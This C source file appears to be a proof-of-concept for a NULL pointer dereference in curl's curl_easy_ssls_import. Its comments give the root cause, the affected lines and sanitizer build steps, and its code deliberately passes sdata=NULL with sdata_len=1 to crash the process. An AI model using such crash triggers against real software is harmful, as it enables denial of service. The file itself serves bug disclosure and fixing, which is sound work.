/*
 * PoC for SF20: NULL pointer dereference when sdata=NULL but sdata_len>0
 * in curl_easy_ssls_import -> Curl_ssl_session_import -> Curl_ssl_session_unpack
 *
 * Affected: curl lib/vtls/vtls_scache.c:Curl_ssl_session_import (line 1097)
 *           curl lib/vtls/vtls_spack.c:Curl_ssl_session_unpack (line 254-259)
 *
 * Root cause:
 *   Curl_ssl_session_import validates that (!ssl_peer_key && (!shmac || !shmac_len))
 *   would be an error, but does NOT validate that sdata is non-NULL when sdata_len>0.
 *   It unconditionally calls Curl_ssl_session_unpack(data, sdata=NULL, sdata_len, &s).
 *   Curl_ssl_session_unpack only has DEBUGASSERT(buf) which is disabled in release.
 *   In sanitizer builds the SEGV on NULL dereference is caught at vtls_spack.c:59.
 *
 * Crash: SEGV at spack_dec8 which reads *buf where buf=NULL.
 *
 * Reproduction:
 *   clang -fsanitize=address -g -O1 poc.c -lcurl -lssl -lcrypto -lz -lpthread -o poc
 *   ASAN_OPTIONS=detect_leaks=0 ./poc
 */
#include <stdio.h>
#include <string.h>
#include <curl/curl.h>

int main(void)
{
    CURL *curl;
    CURLcode res;
    CURLM *multi;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if(!curl) {
        fprintf(stderr, "curl_easy_init() failed\n");
        return 1;
    }

    /* Need a multi handle to initialize the ssl scache */
    multi = curl_multi_init();
    if(!multi) {
        fprintf(stderr, "curl_multi_init() failed\n");
        curl_easy_cleanup(curl);
        return 1;
    }
    curl_multi_add_handle(multi, curl);

    /*
     * Pass ssl_peer_key (non-NULL) so the initial validation passes,
     * but sdata=NULL with sdata_len=1.
     *
     * Code path:
     *   curl_easy_ssls_import
     *     -> Curl_ssl_session_import
     *        -> Curl_ssl_session_unpack(data, NULL, 1, &s)  // CRASH HERE
     *           -> buf = (const unsigned char *)NULL
     *           -> end = NULL + 1
     *           -> spack_dec8(&val8, &buf, end)
     *              -> *val = **src  // dereference NULL -> SEGV
     */
    fprintf(stderr, "[*] Calling curl_easy_ssls_import with sdata=NULL, sdata_len=1\n");
    res = curl_easy_ssls_import(
        curl,
        "example.com:443:IMPL-OpenSSL:G",  /* ssl_peer_key - non-NULL to bypass initial check */
        NULL, 0,                            /* shmac, shmac_len - unused when ssl_peer_key set */
        NULL, 1                             /* sdata=NULL (bug!), sdata_len=1 */
    );

    /* Should not reach here - crash expected */
    fprintf(stderr, "[*] Result: %d (%s)\n", res, curl_easy_strerror(res));

    curl_multi_remove_handle(multi, curl);
    curl_multi_cleanup(multi);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return 0;
}
